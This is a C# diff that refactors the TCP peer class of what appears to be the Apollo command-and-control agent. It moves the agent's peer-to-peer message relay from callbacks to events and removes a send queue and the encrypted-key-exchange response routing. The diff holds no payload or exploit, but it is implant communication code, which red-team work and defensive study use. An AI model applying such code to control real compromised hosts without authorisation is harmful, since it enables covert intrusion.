@@ -18,22 +18,23 @@ using System.Net.Sockets;
 
 namespace Apollo.Peers.TCP
 {
-    public class TCPPeer : AI.Classes.Peer, ITcpClientCallback
+    public class TCPPeer : AI.Classes.P2P.Peer
     {
         private AsyncTcpClient _tcpClient = null;
         private TcpClient _client = null;
-        private bool _expectEKE;
-        private ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
-        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
-        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private Action<object> _sendAction;
         private TTasks.Task _sendTask;
-        private MessageType _serverResponseType;
+
+        public event EventHandler<TcpMessageEventArgs> ConnectionEstablished;
+        public event EventHandler<TcpMessageEventArgs> Disconnect;
+
         public TCPPeer(IAgent agent, PeerInformation info) : base(agent, info)
         {
-            _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port, this);
-            _expectEKE = info.C2Profile.Parameters.EncryptedExchangeCheck == "T";
-
+            C2ProfileName = "tcp";
+            _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port);
+            _tcpClient.ConnectionEstablished += OnConnect;
+            _tcpClient.MessageReceived += OnMessageReceived;
+            _tcpClient.Disconnect += OnDisconnect;
             _sendAction = (object p) =>
             {
                 while (((TcpClient)p).Connected)
@@ -68,26 +69,33 @@ namespace Apollo.Peers.TCP
             return _previouslyConnected && !_client.Connected;
         }
 
-        public void OnAsyncConnect(TcpClient client, out object state)
+        public void OnConnect(object sender, TcpMessageEventArgs args)
         {
-            _client = client;
-            _sendTask = new TTasks.Task(_sendAction, client);
+            args.State = this;
+            if (ConnectionEstablished != null)
+            {
+                ConnectionEstablished(this, args);
+            }
+            _sendTask = new TTasks.Task(_sendAction, args.Client);
             _sendTask.Start();
             _previouslyConnected = true;
-            state = this;
         }
 
-        public void OnAsyncDisconnect(TcpClient client, object state)
+        public void OnDisconnect(object sender, TcpMessageEventArgs args)
         {
-            client.Close();
+            args.Client.Close();
             _sendTask.Wait();
+            if (Disconnect != null)
+            {
+                Disconnect(this, args);
+            }
         }
 
-        public void OnAsyncMessageReceived(TcpClient client, AS.IPCData data, object state)
+        public void OnMessageReceived(object sender, TcpMessageEventArgs args)
         {
             AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(
                 Encoding.UTF8.GetString(
-                    data.Data.Take(data.DataLength).ToArray()
+                    args.Data.Data.Take(args.Data.DataLength).ToArray()
                 )
             );
             lock (_messageOrganizer)
@@ -98,40 +106,6 @@ namespace Apollo.Peers.TCP
                 }
             }
             _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
-        }
-
-        public bool DeserializeToReceiver(byte[] data, MessageType mt)
-        {
-            // Probably where we do sorting based on EKE,
-            // checkin, and get_tasking
-            switch (mt)
-            {
-                // part of the checkin process, flag next message to be of EKE
-                case MessageType.EKEHandshakeMessage:
-                    _serverResponseType = MessageType.EKEHandshakeResponse;
-                    break;
-                default:
-                    _serverResponseType = MessageType.MessageResponse;
-                    break;
-            }
-            _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
-            {
-                UUID = _uuid,
-                C2Profile = "tcp",
-                Message = Encoding.UTF8.GetString(data)
-            });
-            return true;
-        }
-
-        public override void ProcessMessage(DelegateMessage message)
-        {
-            _mythicUUID = message.MythicUUID;
-            AS.IPCChunkedData[] chunks = _serializer.SerializeDelegateMessage(message.Message, _serverResponseType);
-            foreach (AS.IPCChunkedData chunk in chunks)
-            {
-                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-            }
-            _senderEvent.Set();
         }
 
         public override bool Start()
